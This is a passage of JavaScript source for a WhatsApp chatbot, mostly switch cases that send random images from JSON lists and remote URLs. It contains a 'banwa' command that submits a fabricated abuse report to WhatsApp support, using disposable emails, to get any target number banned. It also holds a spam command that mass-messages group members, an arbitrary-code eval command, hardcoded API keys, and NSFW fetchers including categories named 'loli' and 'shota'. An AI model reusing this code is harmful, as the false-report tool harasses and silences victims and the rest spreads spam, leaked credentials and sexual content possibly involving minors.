XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'lizard':
case 'meow':
case 'tickle':
replygcxeon(mess.wait)	
const axios = require('axios')
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
            await XeonBotInc.sendMessage(m.chat,{ caption: mess.success, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('*Kesalahan*')
                })
break
case 'animewallpaper2': case 'animewall2': {
                if (!args.join(" ")) return replygcxeon("Format: *.animewall2 Kata Kunci*")
                replygcxeon(mess.wait)
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                XeonBotInc.sendMessage(m.chat, { caption: `Judul: *${result.title}*\nTipe: *${result.type}*\nSumber: *${result.source}*\nTautan Media: *${result.image[2] || result.image[1] || result.image[0]}*`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcxeon('Format: *.animewall Kata Kunci*')
replygcxeon(mess.wait)
const wall = new AnimeWallpaper();
    const pages = [1,2,3,4];
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null);
const i = Math.floor(Math.random() * wallpaper.length);     
            await XeonBotInc.sendMessage(m.chat, { caption: `Pertanyaan: *${q}*`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('*Kesalahan*')
                })
//XeonBotInc.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
replygcxeon(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '>':
case '=>':
if (!XeonTheCreator) return;
var err = new TypeError;
err.name = "*Kesalahan Evaluasi*"
err.message = "*Kode Tidak Ditemukan (404)*"
if (!q) return replygcxeon(util.format(err))
var arg = command == ">" ? args.join(" ") : "Kembali " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcxeon(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "*Kesalahan Evaluasi*", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcxeon(util.format(_syntax + _err))
}
break;
        case 'banwa': {

if (!XeonTheCreator) return 

if (!text) return replygcxeon(`Format: *.banwa Nomor*`)

let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")

let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")

let cookie = ntah.headers["set-cookie"].join("; ")

let $ = cheerio.load(ntah.data)

let $form = $("form");

let url = new URL($form.attr("action"), "https://www.whatsapp.com").href

let form = new URLSearchParams()

form.append("jazoest", $form.find("input[name=jazoest]").val())

form.append("lsd", $form.find("input[name=lsd]").val())

form.append("step", "submit")

form.append("country_selector", "ID")

form.append("phone_number", text)

form.append("email", email.data[0])

form.append("email_confirm", email.data[0])

form.append("platform", "ANDROID")

form.append("your_message", `Hello Dear WhatsApp

Good morning/afternoon/night

My WhatsApp Number ${text} Stolen And Now Used to spread pornography and illegal sales, please take immediate action regarding my account.

If you can, just disable it

for important chat matters I don't have it

Thank you`)

form.append("__user", "0")

form.append("__a", "1")

form.append("__csr", "")

form.append("__req", "8")

form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")

form.append("dpr", "1")

form.append("__ccg", "UNKNOWN")

form.append("__rev", "1006630858")

form.append("__comment_req", "0")

let res = await axios({

  url,

  method: "POST",

  data: form,

  headers: {

    cookie

  }

})

replygcxeon(util.format(JSON.parse(res.data.replace("for (;;);", ""))))

}

break
case 'pushcontact': {
    if (!XeonTheCreator) return replygcxeon(mess.owner)
      if (!m.isGroup) return replygcxeon(`*Fitur Ini Hanya Berfungsi Di Grup*`)
    if (!text) return replygcxeon(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcxeon(`*Sukses Dalam Mendorong Pesan Ke Kontak*`)
    for (let pler of mem) {
    XeonBotInc.sendMessage(pler, { text: q})
     }  
     replygcxeon(`*Sukses*`)
      }
      break
            case 'id':{
            replygcxeon(from)
           }
          break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcxeon(`Format: *${prefix + command} 😅+🤔*`)
		if (!emoji2) return replygcxeon(`Format: *${prefix + command} 😅+🤔*`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	case 'hentaivid2': {
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
replygcxeon(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
XeonBotInc.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `Judul: *${cejd.title}*
Kategori: *${cejd.category}*
Jenis Mime: *${cejd.type}*
Penonton: *${cejd.views_count}*
Berbagi: *${cejd.share_count}*
Sumber: *${cejd.link}*
Tautan Media: *${cejd.video_1}*` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
                m.reply(mess.wait)
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                XeonBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Judul: *${result912.title}*\nKategori: *${result912.category}*\nJenis Mime: *${result912.type}*\nPenonton: *${result912.views_count}*\nShare: *${result912.share_count}*\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case '18trap': {
  if (!m.isGroup) return replygcxeon(mess.group)
  if (!AntiNsfw) return replygcxeon(mess.nsfw)
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/trap?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
  break;
}
case '18ahegao': {
  if (!m.isGroup) return replygcxeon(mess.group)
  if (!AntiNsfw) return replygcxeon(mess.nsfw)
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/ahegao?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
  break;
}
case '18anal': {
  if (!m.isGroup) return replygcxeon(mess.group)
  if (!AntiNsfw) return replygcxeon(mess.nsfw)
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random2/anal?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
 break;
case '18armpits': {
  if (!m.isGroup) return replygcxeon(mess.group)
  if (!AntiNsfw) return replygcxeon(mess.nsfw)
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/armpits?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18booty': {
  if (!m.isGroup) return replygcxeon(mess.group)
  if (!AntiNsfw) return replygcxeon(mess.nsfw)
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/booty?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18feets': {
  if (!m.isGroup) return replygcxeon(mess.group)
  if (!AntiNsfw) return replygcxeon(mess.nsfw)
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/feets?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18bigtiddies': {
  if (!m.isGroup) return replygcxeon(mess.group)
  if (!AntiNsfw) return replygcxeon(mess.nsfw)
  replygcxeon(mess.wait);
  const imageUrl = 'https://api.lolhuman.xyz/api/random/nsfw/bigtiddies?apikey=Shirooo';
  XeonBotInc.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
}
  break;
case '18blowjob': {
  if (!m.isGroup) return replygcxeon(mess.group)
